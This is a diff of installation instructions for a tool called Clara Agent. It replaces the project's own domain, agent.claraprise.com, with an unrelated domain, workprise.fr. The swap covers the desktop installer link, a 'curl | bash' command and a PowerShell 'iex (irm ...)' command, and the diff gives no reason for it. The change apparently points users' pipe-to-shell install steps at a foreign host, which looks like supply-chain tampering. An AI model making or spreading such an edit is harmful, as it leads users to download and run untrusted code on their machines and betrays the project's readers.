@@ -48,21 +48,21 @@ Pick the row that matches your goal:
 
 ## 1. Install Clara Agent
 ### With the Clara Desktop installer on macOS or Windows (recommended)
-To easily install the command-line and desktop applications, [download the Clara Desktop installer](https://agent.claraprise.com/) from our website and run it.
+To easily install the command-line and desktop applications, [download the Clara Desktop installer](https://workprise.fr/) from our website and run it.
 
 ### Without Clara Desktop:
 For a command-line only install without Clara Desktop, run:
 
 #### Linux / macOS / WSL2 / Android (Termux)
 ```bash
-curl -fsSL https://agent.claraprise.com/install.sh | bash
+curl -fsSL https://workprise.fr/install.sh | bash
 ```
 
 #### Windows (native)
 
 Run in powershell:
 ```powershell
-iex (irm https://agent.claraprise.com/install.ps1) 
+iex (irm https://workprise.fr/install.ps1) 
 ```
 
 :::tip Android / Termux
